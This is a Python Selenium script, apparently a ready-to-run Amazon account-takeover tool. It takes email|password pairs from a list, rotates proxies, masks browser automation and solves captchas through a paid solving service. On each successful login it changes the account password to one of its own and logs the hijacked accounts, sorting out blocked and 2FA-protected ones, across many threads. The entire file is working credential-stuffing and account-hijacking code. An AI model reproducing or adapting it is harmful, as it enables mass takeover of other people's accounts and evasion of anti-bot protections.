import names, os, random, string, phonenumbers, warnings
from captcha_solver import CaptchaSolver
from selenium.webdriver import Keys
clear = lambda: os.system('cls')
clear()
import urllib.request
from glob import iglob
from PIL import Image
from threading import Thread
from colorama import Fore
from selenium import webdriver
from selenium.webdriver.common.by import By
from time import sleep
import random_address
from selenium.webdriver.support.select import Select
from selenium.webdriver.support.wait import WebDriverWait
import phone_iso3166.country as countries
clear()
warnings.filterwarnings("ignore", category=DeprecationWarning)
global url1
# url1="https://sellercentral-europe.amazon.com/ap/signin?openid.pape.max_auth_age=0&openid.return_to=https%3A%2F%2Fsellercentral-europe.amazon.com%2Fsw%2Famazon-pay%2Fonboarding%2FSIGNUP%2Fstep%2FAgreements%3FsolutionProviderId%3DA12EXUMYWB7412%26regRedirection%3D%3FsolutionProviderId%3DA12EXUMYWB7412%26marketplaceId%3DA53RDEWN57UU5%26solutionProviderToken%3DAAAAAQAAAAIAAAAQDfBWFdXSPIQUc9IUxYNxKwAAAHDv2FhReGEGRva8SlqDBoG%2FbSsix2n32IGohEhegImA4rWyGalvBCRMg44JFk6%2BbXdrtEQfMadEertYngoTElX%2FQtpbQ9FYMkb%2Fa0%2Bz2ujrWd%2F3qSoDXPoJ2TKqap5eXkFeOMLjVn5bOB3%2FitFsSRQV%26solutionProviderOptions%3Dlwa%3Bmws-acc%3B%26redirectToSCORE%3D0%26passthrough%252Faccount%3Dpyop%26productTier%3DPYOP_BASIC%26language%3Dde_DE%26passthrough%252FsuperSource%3DOAR%26passthrough%252F*Version*%3D1%26passthrough%252FmarketplaceID%3DA53RDEWN57UU5%26simplifiedLogin%3D2%26passthrough%252FwaiveFee%3D1%26passthrough%252Fld%3DELDELPA-sellercentral.amazon.com%257CSPUNDEAPAA12EXUMYWB7412SWIPE%26registrationId%3DA12EXUMYWB7412_862-3629117-8421517%26passthrough%252Fsource%3Dinternal-landing-select%26passthrough%252Fiswba2%3D0%26passthrough%252F*entries*%3D0%26productType%3DAmazonPayments%26passthrough%252FsimplifiedLogin%3D2&prevRID=QH4924JQRRK6QA58Q1KM&openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.assoc_handle=amzn_ap_onboarding_eu&openid.mode=checkid_setup&openid.ns.pape=http%3A%2F%2Fspecs.openid.net%2Fextensions%2Fpape%2F1.0&language=de_DE&openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&pageId=APOnboarding&disableLoginPrepopulate=1&openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0"
url1="https://www.amazon.com/ap/cnep?openid.return_to=https%3A%2F%2Fwww.amazon.com%2Fyour-account&openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.assoc_handle=usflex&openid.mode=checkid_setup&openid.ns.pape=http%3A%2F%2Fspecs.openid.net%2Fextensions%2Fpape%2F1.0&openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0"
def get_driver():
    chrome_options = webdriver.ChromeOptions()
    # chrome_options = uc.ChromeOptions()
    with open('vpn.txt', 'r') as e:
        proxy = e.readline()
        e.close()
    with open('vpn.txt', 'r') as e:
        data = e.read().splitlines(True)
        e.close()
    with open('vpn.txt', 'w') as e:
        e.writelines(data[1:])
        e.close()
    with open('vpn.txt', 'a') as e:
        e.write(proxy)
        e.close()
    chrome_options.add_argument('--proxy-server=%s' % proxy)
    print(Fore.RED + 'proxy : ' + Fore.GREEN + proxy)
    # chrome_options.experimental_options["prefs"] = {
    #     "profile.managed_default_content_settings.images": 2,
    #     "profile.managed_default_content_settings.stylesheets": 2,
    #     # "profile.managed_default_content_settings.javascript": 2,
    #     "profile.managed_default_content_settings.geolocation": 2,
    #     "profile.default_content_setting_values.notifications": 2,
    # }
    if headless==0:
        chrome_options.add_argument("--headless")
    # chrome_options.add_extension('so.crx')
    # chrome_options = uc.ChromeOptions()
    chrome_options.add_argument("--lang=en-US")
    chrome_options.add_argument("--disable-gpu")
    chrome_options.add_argument("--mute-audio")
    chrome_options.add_argument("disable-infobars")
    chrome_options.add_argument("--clear-token-service")
    chrome_options.add_argument('--disable-popup-blocking')
    chrome_options.add_argument("--aggressive-cache-discard")
    chrome_options.add_argument("--disable-cache")
    chrome_options.add_argument("--disable-application-cache")
    chrome_options.add_argument("--disable-offline-load-stale-cache")
    chrome_options.add_argument("--disable-3d-apis")
    chrome_options.add_argument("--disable-gpu-shader-disk-cache")
    chrome_options.add_argument("--media-cache-size=0")
    chrome_options.add_argument("--disk-cache-size=0")
    chrome_options.add_argument("--disable-blink-features=AutomationControlled")
    chrome_options.add_argument('--disable-gpu')
    chrome_options.add_argument('--disable-dev-shm-usage')
    # chrome_options.add_argument('--blink-settings=imagesEnabled=false')
    # chrome_options.add_argument("--user-agent= Mozilla/5.0 (iPhone; CPU iPhone OS 14_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/87.0.4280.77 Mobile/15E148 Safari/604.1")
    chrome_options.add_argument("--disable-extensions")
    chrome_options.add_argument("--incognito")
    chrome_options.add_argument("--window-size=700,700")
    chrome_options.add_argument("--log-level=3")
    chrome_options.add_experimental_option('excludeSwitches', ['enable-logging'])
    chrome_options.add_argument("--silent")
    chrome_options.add_experimental_option("excludeSwitches", ["enable-automation"])
    chrome_options.add_experimental_option('useAutomationExtension', False)
    driver = webdriver.Chrome('chromedriver.exe', options=chrome_options)
    # driver = uc.Chrome(options=chrome_options)
    driver.execute_script("Object.defineProperty(navigator, 'webdriver', {get: () => undefined})")
    driver.delete_all_cookies()
    return driver

def readEmail():
    with open('Emails.txt', 'r') as e:
        EmailData = e.readline()
        e.close()
    with open('Emails.txt', 'r') as e:
        data = e.read().splitlines(True)
        e.close()
    with open('Emails.txt', 'w') as e:
        e.writelines(data[1:])
        e.close()
    # with open('positions/positionEmails.txt', 'r') as e:
    #     position= e.readline()
    #     e.close()
    # with open('Emails.txt', 'r') as e:
    #     e.seek(int(position))
    #     EmailData = e.readline()
    #     if EmailData=="" or EmailData==" " :
    #         position=0
    #     else:
    #         position = e.tell()
    # with open('positions/positionEmails.txt', 'w') as e:
    #     e.write(str(position))
    #     e.close()
    return EmailData
def createpass():
    password1 = ''
    password2 = ''
    password3 = ''
    chare = 'ASDFGJNBMUHkljbsakvnasluv'
    for i in range(5):
        password1 += random.choice(chare)
    chare = '12345667890123456789'
    for i in range(4):
        password2 += random.choice(chare)
    chare = "!@#$"
    for i in range(3):
        password3 += random.choice(chare)
    password = password1 + password2 + password3
    return password
def StartLogin(driver, EmailData):
    try:
        Email, Pass = str(EmailData).split('|')
        print(Fore.BLUE+"[=] Start Withe >>> "+Email+Fore.RESET)
        driver.get(url1)
        # WebDriverWait(driver, 100).until(EC.presence_of_all_elements_located)
        if "Type the characters you see in this image" in driver.page_source:
            letters = string.ascii_lowercase
            result_str = ''.join(random.choice(letters) for i in range(13))
            with open(f"trash/{result_str}.png", "ab") as file:
                f = 0
                while f == 0:
                    try:
                        captcha_img = WebDriverWait(driver, 100).until(
                            lambda driver: driver.find_element(By.CSS_SELECTOR, "div.a-row.a-text-center > img"))
                        file.write(captcha_img.screenshot_as_png)
                        f = 1
                    except:
                        f = 0
            with open("captcha code.txt", "r") as c:
                cap = c.readline()
                solver = CaptchaSolver('2captcha', api_key=f'{cap}')
                raw_data = open(f"trash/{result_str}.png", 'rb').read()
            solving_captcha = solver.solve_captcha(raw_data)
            WebDriverWait(driver, 100).until(
                lambda driver: driver.find_element("id", "captchacharacters")).send_keys(
                solving_captcha)
            sleep(0.1)
            WebDriverWait(driver, 100).until(
                lambda driver: driver.find_element(By.CSS_SELECTOR, value="span > button")).click()
            sleep(0.1)
            os.remove(f'trash/{result_str}.png')

        if 'ap_password' in driver.page_source:
            WebDriverWait(driver, 20).until(lambda driver: driver.find_element(by=By.NAME, value='email')).send_keys(
                Email)
            WebDriverWait(driver, 20).until(lambda driver: driver.find_element(by=By.NAME, value='password')).send_keys(
                Pass, Keys.RETURN)

        else:
            WebDriverWait(driver, 20).until(lambda driver: driver.find_element(by=By.NAME, value='email')).send_keys(
                Email, Keys.RETURN)
            WebDriverWait(driver, 20).until(lambda driver: driver.find_element(by=By.NAME, value='password')).send_keys(
                Pass, Keys.RETURN)
        sleep(0.3)
        if "auth-warning-message-box" in driver.page_source:
            WebDriverWait(driver, 20).until(
                lambda driver: driver.find_element(by=By.NAME, value='password')).clear()
            WebDriverWait(driver, 20).until(
                lambda driver: driver.find_element(by=By.NAME, value='password')).send_keys(
                Pass)
            letters = string.ascii_lowercase
            result_str = ''.join(random.choice(letters) for i in range(15))
            srccaptchavalue = WebDriverWait(driver, 100).until(
                lambda driver: driver.find_element(By.CSS_SELECTOR, "#auth-captcha-image")).get_attribute("src")
            if ('.gif' in srccaptchavalue):
                urllib.request.urlretrieve(srccaptchavalue, "trash/%s.gif" % (result_str))
                frame = Image.open(f'trash/{result_str}.gif')
                nframes = 0
                rep = 0
                numoffile = 1
                while frame:
                    if nframes == 0 or nframes == rep + 7 and nframes < 42:
                        frame.save(f'trash/{result_str}-%s.png' % (numoffile), 'PNG')
                        inf = f'trash/{result_str}-%s.png' % (numoffile)
                        im = Image.open(inf)
                        crop_rectangle = (im.width - 40, 0, im.width, im.height)
                        cropped_im = im.crop(crop_rectangle)
                        cropped_im.save('%s' % inf, 'PNG')
                        numoffile += 1
                        rep = nframes
                    nframes += 1
                    try:
                        frame.seek(nframes)
                    except EOFError:
                        break
                ins = 1
                new_im = Image.new('RGB', (40 * 6, 70), (250, 250, 250))
                numoffile = 1
                for fn in sorted(iglob(f'trash/{result_str}-%s.png' % (numoffile))):
                    img = Image.open(fn)
                    if ins == 1:
                        new_im.paste(img, (0, 0))
                    if ins == 2:
                        new_im.paste(img, (40, 0))
                    if ins == 3:
                        new_im.paste(img, (40 * 2, 0))
                    if ins == 4:
                        new_im.paste(img, (40 * 3, 0))
                    if ins == 5:
                        new_im.paste(img, (40 * 4, 0))
                    if ins == 6:
                        new_im.paste(img, (40 * 5, 0))
                    ins += 1
                numoffile = 2
                for fn in sorted(iglob(f'trash/{result_str}-%s.png' % (numoffile))):
                    img = Image.open(fn)
                    if ins == 1:
                        new_im.paste(img, (0, 0))
                    if ins == 2:
                        new_im.paste(img, (40, 0))
                    if ins == 3:
                        new_im.paste(img, (40 * 2, 0))
                    if ins == 4:
                        new_im.paste(img, (40 * 3, 0))
                    if ins == 5:
                        new_im.paste(img, (40 * 4, 0))
                    if ins == 6:
                        new_im.paste(img, (40 * 5, 0))
                    ins += 1
                numoffile = 3
                for fn in sorted(iglob(f'trash/{result_str}-%s.png' % (numoffile))):
                    img = Image.open(fn)
                    if ins == 1:
                        new_im.paste(img, (0, 0))
                    if ins == 2:
                        new_im.paste(img, (40, 0))
                    if ins == 3:
                        new_im.paste(img, (40 * 2, 0))
                    if ins == 4:
                        new_im.paste(img, (40 * 3, 0))
                    if ins == 5:
                        new_im.paste(img, (40 * 4, 0))
                    if ins == 6:
                        new_im.paste(img, (40 * 5, 0))
                    ins += 1
                numoffile = 4
                for fn in sorted(iglob(f'trash/{result_str}-%s.png' % (numoffile))):
                    img = Image.open(fn)
                    if ins == 1:
                        new_im.paste(img, (0, 0))
                    if ins == 2:
                        new_im.paste(img, (40, 0))
                    if ins == 3:
                        new_im.paste(img, (40 * 2, 0))
                    if ins == 4:
                        new_im.paste(img, (40 * 3, 0))
                    if ins == 5:
                        new_im.paste(img, (40 * 4, 0))
                    if ins == 6:
                        new_im.paste(img, (40 * 5, 0))
                    ins += 1
                numoffile = 5
                for fn in sorted(iglob(f'trash/{result_str}-%s.png' % (numoffile))):
                    img = Image.open(fn)
                    if ins == 1:
                        new_im.paste(img, (0, 0))
                    if ins == 2:
                        new_im.paste(img, (40, 0))
                    if ins == 3:
                        new_im.paste(img, (40 * 2, 0))
                    if ins == 4:
                        new_im.paste(img, (40 * 3, 0))
                    if ins == 5:
                        new_im.paste(img, (40 * 4, 0))
                    if ins == 6:
                        new_im.paste(img, (40 * 5, 0))
                    ins += 1
                numoffile = 6
                for fn in sorted(iglob(f'trash/{result_str}-%s.png' % (numoffile))):
                    img = Image.open(fn)
                    if ins == 1:
                        new_im.paste(img, (0, 0))
                    if ins == 2:
                        new_im.paste(img, (40, 0))
                    if ins == 3:
                        new_im.paste(img, (40 * 2, 0))
                    if ins == 4:
                        new_im.paste(img, (40 * 3, 0))
                    if ins == 5:
                        new_im.paste(img, (40 * 4, 0))
                    if ins == 6:
                        new_im.paste(img, (40 * 5, 0))
                    ins += 1
                new_im.save(f'trash/{result_str}.jpg', "JPEG", quality=80, optimize=True, progressive=True)
                with open("captcha code.txt", "r") as c:
                    cap = c.readline()
                    solver = CaptchaSolver('2captcha', api_key=f'{cap}')
                    raw_data = open(f"trash/{result_str}.jpg", 'rb').read()

                solving_captcha = solver.solve_captcha(raw_data)
                # print(solving_captcha+"   11111111111111111111111111111111111")
                # WebDriverWait(driver, 50).until(EC.presence_of_element_located(
                #     (By.XPATH, '//*[@id="cvf-page-content"]/div/div/div/form/div[2]/div/input'))).send_keys(
                #     solving_captcha[0:6], Keys.RETURN)
                try:
                    WebDriverWait(driver, 100).until(
                        lambda driver: driver.find_element("id", "auth-captcha-guess")).send_keys(
                        solving_captcha)
                    sleep(0.1)
                    WebDriverWait(driver, 100).until(lambda driver: driver.find_element("id", "signInSubmit")).click()
                    # WebDriverWait(driver, 50).until(EC.presence_of_element_located(
                    #     (By.XPATH, '/html/body/div[1]/div[1]/div[2]/div/div[2]/div/div/form/div/div/div/div[3]/div[1]/input'))).send_keys(
                    #     solving_captcha[0:6], Keys.RETURN)
                except:
                    print(2222222222222)
                sleep(0.5)
            else:
                letters = string.ascii_lowercase
                result_str = ''.join(random.choice(letters) for i in range(8))
                WebDriverWait(driver, 20).until(
                    lambda driver: driver.find_element(by=By.NAME, value='password')).clear()
                WebDriverWait(driver, 20).until(
                    lambda driver: driver.find_element(by=By.NAME, value='password')).send_keys(
                    Pass)
                with open(f"trash/{result_str}.png", "ab") as file:
                    captcha_img = WebDriverWait(driver, 100).until(
                        lambda driver: driver.find_element(By.CSS_SELECTOR, "#auth-captcha-image"))
                    file.write(captcha_img.screenshot_as_png)
                with open("captcha code.txt", "r") as c:
                    cap = c.readline()
                    solver = CaptchaSolver('2captcha', api_key=f'{cap}')
                    raw_data = open(f"trash/{result_str}.png", 'rb').read()
                solving_captcha = solver.solve_captcha(raw_data)
                WebDriverWait(driver, 100).until(
                    lambda driver: driver.find_element("id", "auth-captcha-guess")).send_keys(
                    solving_captcha)
                sleep(0.1)
                WebDriverWait(driver, 100).until(lambda driver: driver.find_element("id", "signInSubmit")).click()
                sleep(0.2)
                os.remove(f'trash/{result_str}.png')
            sleep(0.3)
        if "auth-error-message-box" in driver.page_source or "forgotpassword/reverification?" in driver.current_url:
            if "Enter the characters as they are given in the challenge" in driver.page_source:
                print(
                    Fore.LIGHTRED_EX + "[!] error captcha" + Fore.RESET)
                with open("error captcha.txt", 'a') as f:
                    f.write(Email + "|" + Pass)
                driver.quit()
            else:
                print(
                    Fore.LIGHTRED_EX + "[!] Invalid Login, Check Your Email or Password or maybe Account Blocked!" + Fore.RESET)
                with open("AccountBlocked.txt", 'a') as f:
                    f.write(Email + "|" + Pass)
                driver.quit()
        sleep(0.3)
        try:
            driver.find_element(By.XPATH,
                                "/html/body/div[1]/div[1]/div[2]/div/div[2]/div/div/div/form/div/div[5]/div/a").click()
        except:
            pass

        if "Type the characters you see in this image" in driver.page_source:
            letters = string.ascii_lowercase
            result_str = ''.join(random.choice(letters) for i in range(3))
            with open(f"trash/{result_str}.png", "ab") as file:
                f = 0
                while f == 0:
                    try:
                        captcha_img = WebDriverWait(driver, 100).until(
                            lambda driver: driver.find_element(By.CSS_SELECTOR, "div.a-row.a-text-center > img"))
                        file.write(captcha_img.screenshot_as_png)
                        f = 1
                    except:
                        f = 0
            with open("captcha code.txt", "r") as c:
                cap = c.readline()
                solver = CaptchaSolver('2captcha', api_key=f'{cap}')
                raw_data = open(f"trash/{result_str}.png", 'rb').read()
            solving_captcha = solver.solve_captcha(raw_data)
            WebDriverWait(driver, 100).until(
                lambda driver: driver.find_element("id", "captchacharacters")).send_keys(
                solving_captcha)
            sleep(0.1)
            WebDriverWait(driver, 100).until(
                lambda driver: driver.find_element(By.CSS_SELECTOR, value="span > button")).click()
            sleep(0.1)
            os.remove(f'trash/{result_str}.png')

        if "For your security, approve the notification sent to:" in driver.page_source :
            with open("sellerCenter.txt",'a') as f :
                 f.write(Email+"|"+Pass)
            print(Fore.YELLOW + " seller Center " + Email + Fore.RESET)
            driver.quit()
        else:
            NewPass=open("password.txt",'r').readline()
            WebDriverWait(driver, 10).until(lambda driver:driver.find_element(by=By.ID,value='auth-cnep-edit-password-button')).click()
            sleep(0.5)
            WebDriverWait(driver, 10).until(lambda driver:driver.find_element(by=By.ID,value='ap_password')).send_keys(str(Pass).strip())
            WebDriverWait(driver, 10).until(lambda driver:driver.find_element(by=By.ID,value='ap_password_new')).send_keys(NewPass)
            WebDriverWait(driver, 10).until(lambda driver:driver.find_element(by=By.ID,value='ap_password_new_check')).send_keys(NewPass)
            WebDriverWait(driver, 10).until(lambda driver: driver.find_element(by=By.ID, value='cnep_1D_submit_button')).click()

            # sleep(1)
            with open('SuccessEmail.txt', 'a') as f:
                f.write(Email + "|" + NewPass.strip()+"\n")
            print(Fore.GREEN + "[=] Success Email >>> " + Email +"|"+NewPass+ Fore.RESET)
            driver.quit()

    except:
        try:
            driver.quit()
        except:
            pass
def main():
    while True:
        try:
            driver = get_driver()
            EmailData = readEmail()
            StartLogin(driver, EmailData)
        except:
            pass
def cls(): os.system('cls' if os.name == 'nt' else 'clear')
def logo():
    cls()
    print(Fore.WHITE+'''
                                        
                            ────────────────────────────────────────────────────────────
                            ─██████──████████────████████████████──────██████████████───
                            ─██░░██──██░░░░██────██░░░░░░░░░░░░██──────██░░░░░░░░░░██───
                            ─██░░██──██░░████────██░░████████░░██──────██░░██████░░██───
                            ─██░░██──██░░██──────██░░██────██░░██──────██░░██──██░░██───
                            ─██░░██████░░██──────██░░████████░░██──────██░░██████░░████─
                            ─██░░░░░░░░░░██──────██░░░░░░░░░░░░██──────██░░░░░░░░░░░░██─
                            ─██░░██████░░██──────██░░██████░░████──────██░░████████░░██─
                            ─██░░██──██░░██──────██░░██──██░░██────────██░░██────██░░██─
                            ─██░░██──██░░████────██░░██──██░░██████────██░░████████░░██─
                            ─██░░██──██░░░░██────██░░██──██░░░░░░██────██░░░░░░░░░░░░██─
                            ─██████──████████────██████──██████████────████████████████─
                            ────────────────────────────────────────────────────────────
    \n\n\n''')

if __name__ == '__main__':
    logo()
    # This code won't run if this file is imported.
    print("[+] pleas enter number of threads..")
    number_of_threads = input()
    # print("[+] if you need change language enter >> 1 ")
    # try:
    #     AskLang= int(input())
    # except:
    #     AskLang=0
    print("[+] to non headless enter >> 1 ")
    try:
        headless=int(input())
    except:
        headless=0

    def func():
        main()
    for number in range(int(number_of_threads)):
        t = Thread(target=func)
        t.start()
        sleep(1)

